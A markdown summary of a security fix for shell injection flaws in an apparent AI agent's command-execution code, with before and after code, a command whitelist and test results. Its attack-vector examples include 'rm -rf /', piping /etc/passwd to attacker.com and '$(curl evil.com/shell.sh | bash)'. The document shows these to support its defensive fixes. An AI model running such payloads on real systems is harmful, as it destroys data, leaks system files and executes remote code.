# Shell Injection Vulnerability Fix - Summary

## Vulnerabilities Found

Two critical shell injection vulnerabilities were identified in `src/hexclamp/agent.py`:

### 1. CODE Execution (Line 75-81)
**Before:**
```python
result = subprocess.run(
    script,
    shell=True,  # ❌ VULNERABLE: Allows arbitrary command execution
    cwd=self.workspace,
    capture_output=True,
    text=True,
    timeout=30,
)
```

**Attack Vector:**
```python
# Malicious input
script = "ls; rm -rf /"
# or
script = "cat /etc/passwd | mail attacker.com"
# or  
script = "$(curl evil.com/shell.sh | bash)"
```

### 2. RESEARCH Execution (Line 106-113)
**Before:**
```python
result = subprocess.run(
    [cmd] + list(action.args),
    shell=cmd in ("grep", "find", "rg"),  # ❌ VULNERABLE: Conditional shell=True
    cwd=self.workspace,
    capture_output=True,
    text=True,
    timeout=30,
)
```

**Attack Vector:**
```python
# Even with whitelisted command, args can inject
cmd = "grep"
args = ["pattern; rm -rf /", "file.txt"]
```

## Security Fixes Applied

### 1. Added Command Whitelist
```python
# Whitelist of allowed commands for security
ALLOWED_SHELL_COMMANDS = frozenset([
    "grep", "find", "rg", "ls", "cat", "head", "tail", "wc"
])
```

### 2. Added Input Validation
```python
# Block dangerous shell metacharacters
DANGEROUS_CHARS = [";", "|", "&", "$", "`", "(", ")", "<", ">", "\\", "\n", "\r"]

def validate_script(script):
    if not script or not isinstance(script, str):
        return False, "Invalid script"
    for char in DANGEROUS_CHARS:
        if char in script:
            return False, f"Security error: dangerous character '{char}'"
    return True, None
```

### 3. Replaced shell=True with shell=False
**After (CODE execution):**
```python
# Parse command safely using shlex
cmd_parts = shlex.split(script)

# Validate command is whitelisted
base_cmd = cmd_parts[0]
if base_cmd not in ALLOWED_SHELL_COMMANDS:
    return Result(success=False, message=f"Command not allowed: {base_cmd}")

# Execute safely without shell=True
result = subprocess.run(
    cmd_parts,
    shell=False,  # ✅ SECURE: No shell interpretation
    cwd=self.workspace,
    capture_output=True,
    text=True,
    timeout=30,
)
```

**After (RESEARCH execution):**
```python
# Validate command is in whitelist
if cmd not in ALLOWED_SHELL_COMMANDS:
    return Result(success=False, message=f"Command not allowed: {cmd}")

# Validate and sanitize arguments
args = []
for arg in action.args:
    for char in DANGEROUS_CHARS:
        if char in arg:
            return Result(success=False, message=f"Security error: dangerous character")
    args.append(arg)

# Execute safely without shell=True
result = subprocess.run(
    [cmd] + args,
    shell=False,  # ✅ SECURE: No shell interpretation
    cwd=self.workspace,
    capture_output=True,
    text=True,
    timeout=30,
)
```

### 4. Added Path Traversal Prevention
```python
# Prevent path traversal in read/write operations
path = self.workspace / path_str
try:
    path = path.resolve()
    path.relative_to(self.workspace.resolve())
except (ValueError, RuntimeError):
    return Result(success=False, message="Invalid path: outside workspace")
```

## Complete Fixed Code

See `src/hexclamp/agent.py` for the complete fixed implementation.

Key changes:
- Added `import shlex` (line 5)
- Added `ALLOWED_SHELL_COMMANDS` whitelist (line 14)
- Fixed `_execute_code()` method (lines 54-142)
- Fixed `_execute_research()` method (lines 144-192)

## Test Results

All 16 security tests pass:

```
✓ Blocks semicolon injection
✓ Blocks pipe injection
✓ Blocks ampersand injection
✓ Blocks dollar sign injection
✓ Blocks backtick injection
✓ Blocks redirect injection
✓ Blocks non-whitelisted command (rm)
✓ Blocks 11 dangerous commands: rm, curl, wget, nc, netcat, python, python3, bash, sh, chmod, chown
✓ Allows all 8 whitelisted commands
✓ Allows 7 safe scripts
✓ Research blocks shell metacharacters in args
✓ Research allows safe arguments
✓ subprocess.run with shell=False works correctly
✓ Dangerous shell=True pattern is now blocked
✓ Blocks 4 path traversal attempts
✓ Allows 3 safe paths

Results: 16 passed, 0 failed
```

## Run Tests

```bash
# Run direct security tests (no dependencies)
python3 tests/test_security_direct.py

# Run full integration tests (requires Python 3.10+)
python3 -m pytest tests/test_agent_security.py -v
```

## Security Principles Applied

1. **Defense in Depth**: Multiple layers of validation (command whitelist + metacharacter blocking + shell=False)
2. **Principle of Least Privilege**: Only allow specific, necessary commands
3. **Input Validation**: Validate all user input before use
4. **Safe Defaults**: shell=False is the default and only mode
5. **Fail Secure**: Invalid input is rejected with clear error messages

## OWASP References

- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
